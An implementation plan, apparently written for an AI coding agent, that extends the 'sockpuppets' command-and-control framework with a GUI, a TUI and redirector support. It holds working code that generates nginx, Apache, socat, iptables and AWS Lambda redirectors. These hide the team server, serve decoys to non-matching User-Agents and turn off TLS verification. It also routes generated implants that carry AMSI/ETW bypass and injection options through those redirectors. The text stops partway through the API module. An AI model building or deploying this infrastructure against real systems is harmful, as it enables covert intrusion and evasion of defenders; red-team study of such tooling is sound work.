# GUI, TUI & Redirector Support — Implementation Plan

> **For agentic workers:** REQUIRED SUB-SKILL: Use superpowers:subagent-driven-development (recommended) or superpowers:executing-plans to implement this plan task-by-task. Steps use checkbox (`- [ ]`) syntax for tracking.

**Goal:** Add an optional web GUI (Cobalt Strike layout, Frutiger Aero aesthetic), an optional Textual TUI, and redirector infrastructure support to the sockpuppets C2 framework.

**Architecture:** A shared `EventBus` wired into `SockPuppetsServer` provides real-time events to both the web GUI (via FastAPI WebSocket) and the TUI (in-process). A redirector config system handles YAML parsing and deploy-config generation. Both GUI and TUI are gated behind lazy imports so core CLI works without new dependencies.

**Tech Stack:** Python 3.12+, FastAPI + Uvicorn (GUI), Textual (TUI), PyYAML (redirectors — already a dependency), vanilla JS + CSS (frontend).

## Global Constraints

- Core `requirements.txt` is unchanged — GUI and TUI deps live in separate requirements files
- All new packages use lazy imports with helpful error messages on missing deps
- `redirectors/private/` is `.gitignore`'d (operator-specific configs)
- No NPM, no build step — all frontend assets are static files served by FastAPI
- Auth token derived from existing encryption key via HMAC — no user database
- Tests use `pytest`; API tests use `httpx` (FastAPI TestClient)

---

## File Map

### New Files

| File | Responsibility |
|------|---------------|
| `gui/__init__.py` | FastAPI app factory, mounts API router + static files, start/stop functions |
| `gui/api.py` | All REST endpoints (server control, agents, generate, redirectors, infrastructure) |
| `gui/ws.py` | WebSocket endpoint consuming EventBus, per-operator connections |
| `gui/auth.py` | HMAC token derivation, FastAPI dependency for auth verification |
| `gui/static/index.html` | SPA shell — toolbar, agent table, bottom tabs, modals |
| `gui/static/app.js` | All client logic — WebSocket, API calls, DOM manipulation, state management |
| `gui/static/style.css` | Frutiger Aero theme — frosted glass, gradients, dark mode, animations |
| `tui/__init__.py` | Dependency check, launch function |
| `tui/app.py` | Main Textual App — screen layout, key bindings, event loop integration |
| `tui/widgets.py` | AgentTable, ConsolePanel, EventLog, GenerateDialog, InfrastructureView, StatusBar |
| `redirectors/__init__.py` | RedirectorConfig dataclass, parse/list/deploy functions |
| `redirectors/default.yaml` | No-op redirector (direct connection) |
| `redirectors/private/EXAMPLE.md` | Usage instructions for operator configs |
| `requirements-gui.txt` | `fastapi>=0.100.0`, `uvicorn>=0.23.0` |
| `requirements-tui.txt` | `textual>=0.40.0` |
| `tests/test_eventbus.py` | EventBus unit tests |
| `tests/test_redirectors.py` | Redirector parsing + config generation tests |
| `tests/test_gui_api.py` | API endpoint tests via FastAPI TestClient |

### Modified Files

| File | Changes |
|------|---------|
| `server.py` | Add `EventBus` class. Add `self.events` to `SockPuppetsServer.__init__`. Emit events from `register_agent`, `handle_agent` (disconnect, result), `send_command_to_agent`, `kill_agent`. Add `trusted_redirectors` param + `X-Forwarded-For` parsing. |
| `agent.py` | Add `redirector` param to `generate_python_agent`, `generate_all`, and all `generate_*` methods. Resolve redirector config → connect address. |
| `main.py` | Add `--gui`, `--tui` CLI args. Add `do_gui`, `do_redirectors`, `do_redirector_deploy` commands. Lazy-import gui/tui. |
| `.gitignore` | Add `redirectors/private/` |

---

### Task 1: EventBus + Server Instrumentation

**Files:**
- Modify: `server.py` — add EventBus class (top of file after imports), wire into SockPuppetsServer
- Create: `tests/test_eventbus.py`

**Interfaces:**
- Produces: `EventBus` class with `subscribe() -> asyncio.Queue`, `unsubscribe(q)`, `emit(event: dict)`. `SockPuppetsServer.events: EventBus` attribute. Events emitted as dicts with keys `event`, `timestamp`, and event-specific data.

- [ ] **Step 1: Write EventBus tests**

Create `tests/test_eventbus.py`:

```python
import asyncio
import pytest

import sys, os
sys.path.insert(0, os.path.dirname(os.path.dirname(os.path.abspath(__file__))))

from server import EventBus


@pytest.fixture
def bus():
    return EventBus()


def test_subscribe_returns_queue(bus):
    q = bus.subscribe()
    assert isinstance(q, asyncio.Queue)


def test_emit_delivers_to_subscriber(bus):
    q = bus.subscribe()
    bus.emit({"event": "test", "data": 42})
    assert not q.empty()
    item = q.get_nowait()
    assert item["event"] == "test"
    assert item["data"] == 42


def test_emit_delivers_to_multiple_subscribers(bus):
    q1 = bus.subscribe()
    q2 = bus.subscribe()
    bus.emit({"event": "ping"})
    assert q1.get_nowait()["event"] == "ping"
    assert q2.get_nowait()["event"] == "ping"


def test_unsubscribe_stops_delivery(bus):
    q = bus.subscribe()
    bus.unsubscribe(q)
    bus.emit({"event": "after_unsub"})
    assert q.empty()


def test_emit_adds_timestamp(bus):
    q = bus.subscribe()
    bus.emit({"event": "test"})
    item = q.get_nowait()
    assert "timestamp" in item
```

- [ ] **Step 2: Run tests to verify they fail**

Run: `cd /Users/ajman/Documents/projects/sockpuppets && python -m pytest tests/test_eventbus.py -v`
Expected: ImportError — `EventBus` not defined in server.py

- [ ] **Step 3: Implement EventBus in server.py**

Add after the `logging.getLogger('websockets')` line (around line 39) in `server.py`:

```python
from datetime import datetime


class EventBus:
    """Lightweight pub/sub for real-time GUI/TUI events."""

    def __init__(self):
        self._subscribers: list[asyncio.Queue] = []

    def subscribe(self) -> asyncio.Queue:
        q = asyncio.Queue()
        self._subscribers.append(q)
        return q

    def unsubscribe(self, q: asyncio.Queue):
        self._subscribers.discard(q) if hasattr(self._subscribers, 'discard') else (
            self._subscribers.remove(q) if q in self._subscribers else None
        )

    def emit(self, event: dict):
        event.setdefault("timestamp", datetime.now().isoformat())
        for q in list(self._subscribers):
            try:
                q.put_nowait(event)
            except asyncio.QueueFull:
                pass
```

- [ ] **Step 4: Add EventBus to SockPuppetsServer.__init__**

In `SockPuppetsServer.__init__` (around line 82), add after `self.profile = None` block:

```python
        self.events = EventBus()
        self.trusted_redirectors: list[str] = []
```

- [ ] **Step 5: Wire events into server methods**

In `register_agent` (line 213), after `logger.info(...)`:

```python
        self.events.emit({
            "event": "agent_registered",
            "agent": agent.get_info(),
        })
```

In `handle_agent`, in the `finally` block (line 356), after `self.active_connections.discard(websocket)`:

```python
                self.events.emit({
                    "event": "agent_disconnected",
                    "agent_id": agent_id,
                })
```

In `handle_agent`, in the `response` message type handler (around line 311), after `agent.last_seen = datetime.now()`:

```python
                            self.events.emit({
                                "event": "agent_result",
                                "agent_id": agent_id,
                                "command": command,
                                "output": output[:500],
                            })
```

In `send_command_to_agent` (line 404), after `await agent.command_queue.put(command)`:

```python
        event_type = "command_queued" if agent.mode == "beacon" else "command_sent"
        self.events.emit({
            "event": event_type,
            "agent_id": agent_id,
            "command": command,
            "operator": "cli",
        })
```

In `kill_agent` (line 598), after `del self.agents[agent_id]`:

```python
                    self.events.emit({
                        "event": "agent_killed",
                        "agent_id": agent_id,
                    })
```

- [ ] **Step 6: Add trusted_redirectors + X-Forwarded-For parsing**

In `register_agent`, replace the line `metadata['ip'] = websocket.remote_address[0]`:

```python
        remote_ip = websocket.remote_address[0]
        forwarded_for = None
        if hasattr(websocket, 'request_headers'):
            forwarded_for = websocket.request_headers.get('X-Forwarded-For')
        if forwarded_for and remote_ip in self.trusted_redirectors:
            metadata['ip'] = forwarded_for.split(',')[0].strip()
        else:
            metadata['ip'] = remote_ip
```

- [ ] **Step 7: Run tests to verify they pass**

Run: `cd /Users/ajman/Documents/projects/sockpuppets && python -m pytest tests/test_eventbus.py -v`
Expected: All 5 tests PASS

- [ ] **Step 8: Commit**

```bash
git add server.py tests/test_eventbus.py
git commit -m "feat: add EventBus and server instrumentation for GUI/TUI events"
```

---

### Task 2: Redirector Config System

**Files:**
- Create: `redirectors/__init__.py`, `redirectors/default.yaml`, `redirectors/private/EXAMPLE.md`
- Create: `tests/test_redirectors.py`
- Modify: `.gitignore` — add `redirectors/private/`

**Interfaces:**
- Produces: `RedirectorConfig` dataclass with fields `name, type, listen, backend, domain, trusted, profile, allow_user_agents, decoy, decoy_target`. Functions: `load_redirector(name: str) -> RedirectorConfig`, `list_redirectors() -> list[RedirectorConfig]`, `generate_deploy_config(config: RedirectorConfig, format: str) -> str` where format is one of `apache`, `nginx`, `socat`, `iptables`, `lambda`.

- [ ] **Step 1: Write redirector tests**

Create `tests/test_redirectors.py`:

```python
import pytest
import sys, os

sys.path.insert(0, os.path.dirname(os.path.dirname(os.path.abspath(__file__))))

from redirectors import RedirectorConfig, load_redirector, list_redirectors, generate_deploy_config


def test_load_default_redirector():
    config = load_redirector("default")
    assert config.name == "default"
    assert config.type == "direct"


def test_load_missing_redirector_raises():
    with pytest.raises(FileNotFoundError):
        load_redirector("nonexistent_xyz_123")


def test_list_redirectors_includes_default():
    configs = list_redirectors()
    names = [c.name for c in configs]
    assert "default" in names


def test_generate_nginx_config():
    config = RedirectorConfig(
        name="test-redir",
        type="https",
        listen="0.0.0.0:443",
        backend="10.0.0.5:8443",
        domain="cdn.example.com",
        trusted=True,
        profile="cdn-cloudfront",
        allow_user_agents=["Mozilla/5.0*"],
        decoy="redirect",
        decoy_target="https://www.example.com",
    )
    output = generate_deploy_config(config, "nginx")
    assert "proxy_pass" in output
    assert "10.0.0.5:8443" in output
    assert "cdn.example.com" in output


def test_generate_apache_config():
    config = RedirectorConfig(
        name="test-redir",
        type="https",
        listen="0.0.0.0:443",
        backend="10.0.0.5:8443",
        domain="cdn.example.com",
        trusted=True,
        profile="cdn-cloudfront",
        allow_user_agents=["Mozilla/5.0*"],
        decoy="redirect",
        decoy_target="https://www.example.com",
    )
    output = generate_deploy_config(config, "apache")
    assert "RewriteEngine" in output
    assert "10.0.0.5:8443" in output


def test_generate_socat_config():
    config = RedirectorConfig(
        name="test-redir",
        type="https",
        listen="0.0.0.0:443",
        backend="10.0.0.5:8443",
        domain="cdn.example.com",
    )
    output = generate_deploy_config(config, "socat")
    assert "socat" in output
    assert "10.0.0.5" in output


def test_generate_iptables_config():
    config = RedirectorConfig(
        name="test-redir",
        type="https",
        listen="0.0.0.0:443",
        backend="10.0.0.5:8443",
        domain="cdn.example.com",
    )
    output = generate_deploy_config(config, "iptables")
    assert "iptables" in output
    assert "DNAT" in output


def test_generate_lambda_config():
    config = RedirectorConfig(
        name="test-redir",
        type="cloud-function",
        listen="",
        backend="10.0.0.5:8443",
        domain="api.example.com",
    )
    output = generate_deploy_config(config, "lambda")
    assert "lambda_handler" in output
    assert "10.0.0.5:8443" in output


def test_generate_unknown_format_raises():
    config = RedirectorConfig(name="test", type="https", backend="1.2.3.4:443", domain="x.com")
    with pytest.raises(ValueError):
        generate_deploy_config(config, "unknown_format")
```

- [ ] **Step 2: Run tests to verify they fail**

Run: `cd /Users/ajman/Documents/projects/sockpuppets && python -m pytest tests/test_redirectors.py -v`
Expected: ImportError — redirectors module not found

- [ ] **Step 3: Create redirectors/default.yaml**

```yaml
name: default
type: direct
description: Direct connection — no redirector. Agents connect to the team server.
```

- [ ] **Step 4: Create redirectors/private/EXAMPLE.md**

```markdown
# Private Redirector Configs

Place operator-specific redirector YAML files in this directory.
They are .gitignore'd and won't be committed to the public repo.

Example file: `my-cdn-redir.yaml`

    name: my-cdn-redir
    type: https
    listen: 0.0.0.0:443
    backend: 10.0.0.5:8443
    domain: cdn-assets.example.com
    trusted: true
    profile: cdn-cloudfront
    allow_user_agents:
      - "Mozilla/5.0*"
    decoy: redirect
    decoy_target: https://www.example.com

Then generate agents:

    sockpuppets> generate 10.0.0.5 8443 --redirector=my-cdn-redir

And deploy configs:

    sockpuppets> redirector-deploy my-cdn-redir nginx
```

- [ ] **Step 5: Implement redirectors/__init__.py**

```python
"""Redirector config system — parse YAML configs and generate deploy configs."""

import os
from dataclasses import dataclass, field
from pathlib import Path

try:
    import yaml
    _HAS_YAML = True
except ImportError:
    _HAS_YAML = False

_PROJECT_ROOT = os.path.dirname(os.path.dirname(os.path.abspath(__file__)))
REDIRECTORS_DIR = os.path.join(_PROJECT_ROOT, "redirectors")
REDIRECTORS_PRIVATE_DIR = os.path.join(REDIRECTORS_DIR, "private")


@dataclass
class RedirectorConfig:
    name: str = "default"
    type: str = "direct"
    description: str = ""
    listen: str = ""
    backend: str = ""
    domain: str = ""
    trusted: bool = False
    profile: str = ""
    allow_user_agents: list[str] = field(default_factory=list)
    decoy: str = "404"
    decoy_target: str = ""


def load_redirector(name: str) -> RedirectorConfig:
    """Load a redirector config from redirectors/<name>.yaml.

    Checks private/ first, then the public directory.
    """
    if not _HAS_YAML:
        if name == "default":
            return RedirectorConfig()
        raise ImportError("pyyaml is required to load redirector configs: pip install pyyaml")

    # Check private dir first
    for directory in [REDIRECTORS_PRIVATE_DIR, REDIRECTORS_DIR]:
        path = os.path.join(directory, f"{name}.yaml")
        if os.path.exists(path):
            with open(path, "r") as f:
                raw = yaml.safe_load(f) or {}
            return RedirectorConfig(
                name=raw.get("name", name),
                type=raw.get("type", "direct"),
                description=raw.get("description", ""),
                listen=raw.get("listen", ""),
                backend=raw.get("backend", ""),
                domain=raw.get("domain", ""),
                trusted=bool(raw.get("trusted", False)),
                profile=raw.get("profile", ""),
                allow_user_agents=list(raw.get("allow_user_agents", [])),
                decoy=raw.get("decoy", "404"),
                decoy_target=raw.get("decoy_target", ""),
            )

    raise FileNotFoundError(f"Redirector config not found: {name}.yaml")


def list_redirectors() -> list[RedirectorConfig]:
    """List all available redirector configs (public + private)."""
    configs = []
    seen = set()
    for directory in [REDIRECTORS_PRIVATE_DIR, REDIRECTORS_DIR]:
        if not os.path.isdir(directory):
            continue
        for filename in sorted(os.listdir(directory)):
            if not filename.endswith(".yaml"):
                continue
            name = filename[:-5]
            if name in seen:
                continue
            seen.add(name)
            try:
                configs.append(load_redirector(name))
            except Exception:
                pass
    return configs


def generate_deploy_config(config: RedirectorConfig, fmt: str) -> str:
    """Generate a deploy config for the given redirector.

    Args:
        config: RedirectorConfig to generate for
        fmt: One of 'apache', 'nginx', 'socat', 'iptables', 'lambda'

    Returns:
        Ready-to-deploy config text
    """
    generators = {
        "apache": _gen_apache,
        "nginx": _gen_nginx,
        "socat": _gen_socat,
        "iptables": _gen_iptables,
        "lambda": _gen_lambda,
    }
    if fmt not in generators:
        raise ValueError(f"Unknown format: {fmt}. Supported: {', '.join(generators)}")
    return generators[fmt](config)


def _parse_backend(backend: str) -> tuple[str, str]:
    """Split 'host:port' into (host, port) strings."""
    if ":" in backend:
        host, port = backend.rsplit(":", 1)
        return host, port
    return backend, "443"


def _gen_apache(config: RedirectorConfig) -> str:
    host, port = _parse_backend(config.backend)
    ua_conditions = ""
    if config.allow_user_agents:
        ua_conditions = "\n".join(
            f'RewriteCond %{{HTTP_USER_AGENT}} "{ua}" [NC,OR]'
            for ua in config.allow_user_agents
        )
        # Remove trailing [OR] from last condition
        ua_conditions = ua_conditions.rsplit("[NC,OR]", 1)[0] + "[NC]"

    decoy_rule = ""
    if config.decoy == "redirect":
        decoy_rule = f"RewriteRule ^(.*)$ {config.decoy_target} [L,R=302]"
    elif config.decoy == "404":
        decoy_rule = "RewriteRule ^(.*)$ - [F,L]"

    return f"""# Apache .htaccess — redirector config for {config.name}
# Deploy to the web root of your redirector host: {config.domain}
#
# Requirements: mod_rewrite, mod_proxy, mod_ssl

RewriteEngine On

# Block requests that don't match expected User-Agent
{ua_conditions}
RewriteCond %{{HTTP_USER_AGENT}} !. [OR]
{decoy_rule}

# Forward matching traffic to team server
RewriteRule ^(.*)$ https://{host}:{port}$1 [P,L]

# Proxy settings
SSLProxyEngine On
ProxyPreserveHost Off
RequestHeader set X-Forwarded-For "%{{REMOTE_ADDR}}s"
"""


def _gen_nginx(config: RedirectorConfig) -> str:
    host, port = _parse_backend(config.backend)
    ua_block = ""
    if config.allow_user_agents:
        ua_conditions = " ".join(f'~*"{ua}"' for ua in config.allow_user_agents)
        ua_block = f"""
    # Block non-matching User-Agents
    if ($http_user_agent !{ua_conditions}) {{
        return 302 {config.decoy_target or 'https://www.google.com'};
    }}"""

    return f"""# Nginx config — redirector for {config.name}
# Deploy to /etc/nginx/sites-enabled/{config.name}.conf

server {{
    listen {config.listen or '443 ssl'};
    server_name {config.domain};
{ua_block}

    location / {{
        proxy_pass https://{host}:{port};
        proxy_ssl_verify off;
        proxy_set_header X-Forwarded-For $remote_addr;
        proxy_set_header Host $host;
        proxy_http_version 1.1;
        proxy_set_header Upgrade $http_upgrade;
        proxy_set_header Connection "upgrade";
        proxy_read_timeout 86400;
    }}
}}
"""


def _gen_socat(config: RedirectorConfig) -> str:
    host, port = _parse_backend(config.backend)
    listen_port = config.listen.split(":")[-1] if config.listen else "443"
    return f"""# socat redirector — {config.name}
# Quick TCP forwarding from {config.domain}:{listen_port} to team server

socat TCP-LISTEN:{listen_port},reuseaddr,fork TCP:{host}:{port}

# With TLS termination (requires cert):
# socat OPENSSL-LISTEN:{listen_port},reuseaddr,fork,cert=server.pem,verify=0 TCP:{host}:{port}
"""


def _gen_iptables(config: RedirectorConfig) -> str:
    host, port = _parse_backend(config.backend)
    listen_port = config.listen.split(":")[-1] if config.listen else "443"
    return f"""#!/bin/bash
# iptables redirector — {config.name}
# Raw TCP redirection from :{listen_port} to {host}:{port}

# Enable IP forwarding
echo 1 > /proc/sys/net/ipv4/ip_forward

# DNAT incoming traffic to team server
iptables -t nat -A PREROUTING -p tcp --dport {listen_port} -j DNAT --to-destination {host}:{port}

# Masquerade outgoing traffic
iptables -t nat -A POSTROUTING -j MASQUERADE

# Allow forwarding
iptables -A FORWARD -p tcp -d {host} --dport {port} -j ACCEPT
iptables -A FORWARD -m state --state ESTABLISHED,RELATED -j ACCEPT

# To remove:
# iptables -t nat -D PREROUTING -p tcp --dport {listen_port} -j DNAT --to-destination {host}:{port}
# iptables -t nat -D POSTROUTING -j MASQUERADE
"""


def _gen_lambda(config: RedirectorConfig) -> str:
    host, port = _parse_backend(config.backend)
    return f"""# AWS Lambda redirector — {config.name}
# Deploy as a Lambda function behind API Gateway
#
# API Gateway config:
#   - Type: HTTP API
#   - Route: ANY /{{proxy+}}
#   - Integration: Lambda
#   - Custom domain: {config.domain}

import json
import urllib.request
import urllib.parse
import ssl

BACKEND = "https://{host}:{port}"

def lambda_handler(event, context):
    path = event.get("rawPath", "/")
    method = event.get("requestContext", {{}}).get("http", {{}}).get("method", "GET")
    headers = event.get("headers", {{}})
    body = event.get("body", "")

    # Forward to team server
    url = BACKEND + path
    if event.get("rawQueryString"):
        url += "?" + event["rawQueryString"]

    req = urllib.request.Request(url, method=method)
    req.add_header("X-Forwarded-For", headers.get("x-forwarded-for", "unknown"))
    for k, v in headers.items():
        if k.lower() not in ("host", "content-length"):
            req.add_header(k, v)

    if body:
        req.data = body.encode() if isinstance(body, str) else body

    ctx = ssl.create_default_context()
    ctx.check_hostname = False
    ctx.verify_mode = ssl.CERT_NONE

    try:
        resp = urllib.request.urlopen(req, context=ctx, timeout=30)
        return {{
            "statusCode": resp.status,
            "headers": dict(resp.headers),
            "body": resp.read().decode("utf-8", errors="replace"),
        }}
    except Exception as e:
        return {{
            "statusCode": 502,
            "body": json.dumps({{"error": str(e)}}),
        }}
"""
```

- [ ] **Step 6: Update .gitignore**

Add `redirectors/private/` to `.gitignore` after the existing `transforms/private/` line.

- [ ] **Step 7: Run tests to verify they pass**

Run: `cd /Users/ajman/Documents/projects/sockpuppets && python -m pytest tests/test_redirectors.py -v`
Expected: All 8 tests PASS

- [ ] **Step 8: Commit**

```bash
git add redirectors/ tests/test_redirectors.py .gitignore
git commit -m "feat: add redirector config system with deploy config generation"
```

---

### Task 3: Agent Generation + CLI Redirector Integration

**Files:**
- Modify: `agent.py` — add `redirector` param to `generate_python_agent` (line 907), `generate_all` (line 1710), and the other `generate_*` methods
- Modify: `main.py` — add `--redirector` flag to `do_generate`, add `do_redirectors` and `do_redirector_deploy` commands

**Interfaces:**
- Consumes: `redirectors.load_redirector(name) -> RedirectorConfig` from Task 2
- Produces: When `redirector` is set, generated agents connect to `config.domain:listen_port` instead of `c2_host:c2_port`. CLI commands `redirectors` and `redirector-deploy <name> <format>`.

- [ ] **Step 1: Add redirector param to agent.py generate_python_agent**

In `agent.py`, modify the `generate_python_agent` signature (line 907) to add `redirector: str = None` after `profile: str = 'default'`:

```python
    def generate_python_agent(self, c2_host: str, c2_port: int, encryption_key: str = 'SOCKPUPPETS_KEY_2026',
                              beacon_mode: bool = False, beacon_interval: int = 60, beacon_jitter: int = 0,
                              obfuscate: bool = True, unique_key: bool = False, target_os: str = 'auto',
                              amsi: bool = False, etw: bool = False, syscalls: str = None,
                              inject: str = None, inject_target: str = None, sleep_obf: str = None,
                              idle_encrypt: int = 30, profile: str = 'default',
                              redirector: str = None) -> str:
```

Then at the top of the method body, after the target_os resolution block (after line 936), add:

```python
        # Resolve redirector — agents connect to redirector, not team server directly
        connect_host = c2_host
        connect_port = c2_port
        if redirector:
            from redirectors import load_redirector
            redir_config = load_redirector(redirector)
            if redir_config.domain:
                connect_host = redir_config.domain
            if redir_config.listen:
                listen_port = redir_config.listen.split(":")[-1]
                try:
                    connect_port = int(listen_port)
                except ValueError:
                    pass
            print(f"[*] Agent will connect via redirector: {connect_host}:{connect_port}")
```

Then replace all uses of `c2_host` and `c2_port` in template substitution within this method with `connect_host` and `connect_port`. Search for the template replacement section where `{{C2_HOST}}` and `{{C2_PORT}}` are substituted and change to use the resolved variables.

- [ ] **Step 2: Add redirector param to generate_all**

In `generate_all` (line 1710), add `redirector: str = None` at the end of the signature. Pass it through to all `generate_*` calls:

```python
    def generate_all(self, c2_host: str, c2_port: int, encryption_key: str = 'SOCKPUPPETS_KEY_2026',
                     beacon_mode: bool = False, beacon_interval: int = 60, beacon_jitter: int = 0,
                     compile_exe: bool = False, compile_dll: bool = False, generate_shellcode: bool = False,
                     shellcode_format: str = 'raw', architectures: list = None, upx: bool = True, icon: str = None,
                     target_os: str = 'auto', generate_multi_os: bool = False, unique_key: bool = False,
                     generate_bin: bool = False, raw_shellcode: bool = False,
                     amsi: bool = False, etw: bool = False, syscalls: str = None,
                     inject: str = None, inject_target: str = None, sleep_obf: str = None,
                     idle_encrypt: int = 30, profile: str = 'default',
                     redirector: str = None) -> dict:
```

Add `redirector=redirector` to each `generate_python_agent`, `generate_powershell_agent`, `generate_javascript_agent`, `generate_hta_agent` call within the method.

- [ ] **Step 3: Apply same redirector resolution to other generate methods**

For `generate_powershell_agent`, `generate_javascript_agent`, and `generate_hta_agent` — add `redirector: str = None` param. Add the same redirector resolution block at the top of each method (the `from redirectors import load_redirector` block from Step 1). Replace `c2_host`/`c2_port` with `connect_host`/`connect_port` in template substitution within each method.

- [ ] **Step 4: Add --redirector to main.py do_generate**

In `main.py`, in `do_generate`, add after the `patterns = 'default'` line (around line 566):

```python
        redirector = None
```

In the flag parsing loop, add after the `--patterns` handler:

```python
            elif arg.startswith('--redirector'):
                val = get_value('--redirector')
                if val is None:
                    return
                redirector = val
```

Add `redirector=redirector` to the `generator.generate_all(...)` call.

In the evasion feature summary print block, add:

```python
            if redirector:
                print(f"    - Redirector: {redirector}")
```

Add to the help text in `do_generate`:

```python
            print("      --redirector=NAME      Route agents through a redirector config")
```

- [ ] **Step 5: Add do_redirectors command to main.py**

Add to `SockPuppetsCLI`:

```python
    def do_redirectors(self, arg):
        """List configured redirectors"""
        try:
            from redirectors import list_redirectors
        except ImportError:
            print("[-] Redirector support requires pyyaml: pip install pyyaml")
            return

        configs = list_redirectors()
        if not configs:
            print("[-] No redirector configs found")
            return

        print(f"\n\033[1mConfigured Redirectors:\033[0m")
        print("=" * 70)
        for config in configs:
            status = "\033[92m[active]\033[0m" if config.type != "direct" else "\033[90m[direct]\033[0m"
            print(f"  {status} \033[1m{config.name}\033[0m")
            if config.description:
                print(f"         {config.description}")
            if config.domain:
                print(f"         Domain:  {config.domain}")
            if config.backend:
                print(f"         Backend: {config.backend}")
            if config.profile:
                print(f"         Profile: {config.profile}")
            print()
```

- [ ] **Step 6: Add do_redirector_deploy command to main.py**

```python
    def do_redirector_deploy(self, arg):
        """Generate redirector deploy config: redirector-deploy <name> <format>"""
        try:
            from redirectors import load_redirector, generate_deploy_config
        except ImportError:
            print("[-] Redirector support requires pyyaml: pip install pyyaml")
            return

        args = arg.split()
        if len(args) != 2:
            print("[-] Usage: redirector-deploy <name> <format>")
            print("    Formats: apache, nginx, socat, iptables, lambda")
            return

        name, fmt = args[0], args[1]
        try:
            config = load_redirector(name)
            output = generate_deploy_config(config, fmt)
            print(output)
        except FileNotFoundError:
            print(f"[-] Redirector config not found: {name}")
        except ValueError as e:
            print(f"[-] {e}")
```

- [ ] **Step 7: Add redirector to help text in do_help**

In `do_help`, add to the Generate Options section:

```python
        print("  \033[1m--redirector=NAME\033[0m     Route agents through a redirector config")
```

And add a Redirector Commands section:

```python
        print("\033[1mRedirector Commands:\033[0m")
        print("=" * 70)
        print("  \033[1mredirectors\033[0m                      - List configured redirectors")
        print("  \033[1mredirector-deploy <name> <fmt>\033[0m   - Generate deploy config")
        print()
```

- [ ] **Step 8: Smoke test**

Run: `cd /Users/ajman/Documents/projects/sockpuppets && python -c "from redirectors import load_redirector, list_redirectors; print(list_redirectors())"`
Expected: Prints list containing the default redirector

- [ ] **Step 9: Commit**

```bash
git add agent.py main.py
git commit -m "feat: add redirector support to agent generation and CLI"
```

---

### Task 4: GUI Auth + API Layer

**Files:**
- Create: `gui/__init__.py`, `gui/api.py`, `gui/ws.py`, `gui/auth.py`
- Create: `requirements-gui.txt`
- Create: `tests/test_gui_api.py`

**Interfaces:**
- Consumes: `SockPuppetsServer` (all methods), `EventBus.subscribe()` from Task 1, `redirectors.*` from Task 2, `AgentGenerator` from existing code
- Produces: `create_app(server: SockPuppetsServer, encryption_key: bytes) -> FastAPI` app. `start_gui(server, key, port)` and `stop_gui()` functions.

- [ ] **Step 1: Create requirements-gui.txt**

```
fastapi>=0.100.0
uvicorn>=0.23.0
```

- [ ] **Step 2: Write API tests**

Create `tests/test_gui_api.py`:

```python
import asyncio
import pytest
import sys, os

sys.path.insert(0, os.path.dirname(os.path.dirname(os.path.abspath(__file__))))

try:
    from fastapi.testclient import TestClient
    from gui import create_app
    from server import SockPuppetsServer
    HAS_FASTAPI = True
except ImportError:
    HAS_FASTAPI = False

pytestmark = pytest.mark.skipif(not HAS_FASTAPI, reason="fastapi not installed")

ENCRYPTION_KEY = b"test-key-for-gui"


@pytest.fixture
def server():
    return SockPuppetsServer(encryption_key=ENCRYPTION_KEY)


@pytest.fixture
def client(server):
    app = create_app(server, ENCRYPTION_KEY)
    return TestClient(app)


@pytest.fixture
def auth_headers():
    import hmac, hashlib
    token = hmac.new(ENCRYPTION_KEY, b"sockpuppets-gui-auth", hashlib.sha256).hexdigest()
    return {"Authorization": f"Bearer {token}"}


def test_server_status_unauthorized(client):
    resp = client.get("/api/server/status")
    assert resp.status_code == 401


def test_server_status_authorized(client, auth_headers):
    resp = client.get("/api/server/status", headers=auth_headers)
    assert resp.status_code == 200
    data = resp.json()
    assert "running" in data


def test_agents_empty(client, auth_headers):
    resp = client.get("/api/agents", headers=auth_headers)
    assert resp.status_code == 200
    assert resp.json() == []


def test_profiles_list(client, auth_headers):
    resp = client.get("/api/profiles", headers=auth_headers)
    assert resp.status_code == 200
    data = resp.json()
    assert isinstance(data, list)


def test_redirectors_list(client, auth_headers):
    resp = client.get("/api/redirectors", headers=auth_headers)
    assert resp.status_code == 200
    data = resp.json()
    assert isinstance(data, list)


def test_agent_not_found(client, auth_headers):
    resp = client.get("/api/agents/nonexistent", headers=auth_headers)
    assert resp.status_code == 404
```

- [ ] **Step 3: Run tests to verify they fail**

Run: `pip install fastapi uvicorn httpx && cd /Users/ajman/Documents/projects/sockpuppets && python -m pytest tests/test_gui_api.py -v`
Expected: ImportError — gui module not found

- [ ] **Step 4: Implement gui/auth.py**

```python
"""Token-based auth derived from the C2 encryption key."""

import hmac
import hashlib
from fastapi import Request, HTTPException


def derive_token(encryption_key: bytes) -> str:
    return hmac.new(encryption_key, b"sockpuppets-gui-auth", hashlib.sha256).hexdigest()


def verify_token(token: str, encryption_key: bytes) -> bool:
    expected = derive_token(encryption_key)
    return hmac.compare_digest(token, expected)


class AuthMiddleware:
    """FastAPI dependency that validates Bearer tokens."""

    def __init__(self, encryption_key: bytes):
        self._key = encryption_key

    def __call__(self, request: Request):
        auth = request.headers.get("Authorization", "")
        token = request.query_params.get("token", "")

        if auth.startswith("Bearer "):
            token = auth[7:]

        if not token or not verify_token(token, self._key):
            raise HTTPException(status_code=401, detail="Invalid or missing auth token")

        return token
```

- [ ] **Step 5: Implement gui/api.py**

```python
"""REST API endpoints for the SockPuppets GUI."""

import asyncio
import os
from pathlib import Path

from fastapi import APIRouter, Depends, HTTPException
from pydantic import BaseModel

router = APIRouter(prefix="/api")

# These get set by create_app
_server = None
_auth_dep = None
_loop = None


def init(server, auth_dep, loop=None):
    global _server, _auth_dep, _loop
    _server = server
    _auth_dep = auth_dep
    _loop = loop


def _get_auth():
    return Depends(_auth_dep)


# --- Request models ---

class CommandRequest(BaseModel):
    command: str

class SleepRequest(BaseModel):
    interval: int

class DowngradeRequest(BaseModel):
    interval: int = 60

class SocksRequest(BaseModel):
    port: int

class GenerateRequest(BaseModel):
    host: str
    port: int
    key: str = "SOCKPUPPETS_KEY_2026"
    beacon_mode: bool = False
    interval: int = 60
    jitter: int = 0
    amsi: bool = False
    etw: bool = False
    syscalls: str | None = None
    inject: str | None = None
    inject_target: str | None = None
    sleep_obf: str | None = None
    idle_encrypt: int = 30
    profile: str = "default"
    patterns: str = "default"
    redirector: str | None = None
    target_os: str = "auto"

class DeployRequest(BaseModel):
    format: str


# --- Server control ---

@router.get("/server/status")
async def server_status(_=Depends(lambda: _auth_dep)):
    return {
        "running": _server is not None and hasattr(_server, 'ws_server') and _server.ws_server is not None,
        "host": getattr(_server, 'host', ''),
        "port": getattr(_server, 'port', 0),
        "agent_count": len(_server.agents) if _server else 0,
    }


# --- Agents ---

@router.get("/agents")
async def list_agents(_=Depends(lambda: _auth_dep)):
    if not _server:
        return []
